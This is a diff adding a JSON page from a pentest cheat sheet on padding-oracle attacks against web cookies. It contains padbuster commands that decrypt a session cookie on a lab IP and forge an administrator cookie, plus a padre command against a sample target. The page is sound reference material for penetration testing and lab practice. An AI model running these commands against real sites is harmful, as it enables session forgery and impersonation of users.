@@ -1,0 +1,65 @@
+{
+    "title": "Cookie Padding",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "sections": [
+        {
+            "type": "code_block",
+            "content": [
+                "# https://github.com/AonCyberLabs/PadBuster",
+                "# Get cookie structure",
+                "padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies \"hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka\" -error \"Invalid padding\"",
+                "# Get cookie for other user (impersonation)",
+                "padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies \"hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka\" -error \"Invalid padding\" -plaintext 'user=administratorhc0nwithyhackme'",
+                "",
+                "#https://github.com/glebarez/padre",
+                "padre -u 'https://target.site/profile.php' -cookie 'SESS=$' 'Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg=='",
+                "",
+                "# https://github.com/Kibouo/rustpad",
+                ""
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2022-01-19T15:38:04.810Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/cookie-padding.md",
+        "previous_page": {
+            "title": "XXE",
+            "url": "/enumeration/web/xxe"
+        },
+        "next_page": {
+            "title": "Webshells",
+            "url": "/enumeration/web/web-shells"
+        }
+    }
+}
